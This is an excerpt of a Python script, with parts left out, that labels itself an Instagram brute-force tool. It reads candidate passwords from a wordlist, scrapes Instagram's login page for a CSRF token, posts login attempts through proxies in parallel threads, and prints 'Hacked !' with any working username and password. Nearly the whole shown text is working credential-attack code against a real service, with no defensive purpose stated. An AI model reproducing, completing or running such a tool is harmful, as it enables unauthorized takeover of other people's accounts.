...
def get_args():
    parser = argparse.ArgumentParser(
        description=" instagram Brute Force , By Eng Yazeed .."
    )
    parser.add_argument(
        "-u",
        "--username",
...
def instagram(user, password, release):
    ...
    try:
        ...
        script = (
            BeautifulSoup(csrfRequest.content, "html.parser")
            .find("body")
            .find("script", text=re.compile("window._sharedData"))
        )
        ...
        login = session.post(
            url + "ajax/", data=login_data, allow_redirects=True, proxies=proxy
        )
        data = login.json()
        time.sleep(0.2)
        ...
        if 'authenticated": true' in req_login:
            ...
            print(
                style.GREEN,
                "Hacked ! > username ==> : " + user + ": password ==> : " + password,
            )
            ...
            print(
                (
                    style.CYAN,
                    "" + user + ":" + password + " ->  Good It has to be checked ",
                )
            )
...
def main():
    ...
    for line in fn.readlines():
        ...
        t = Thread(target=instagram, args=(username, password, True))
        child = t.start()
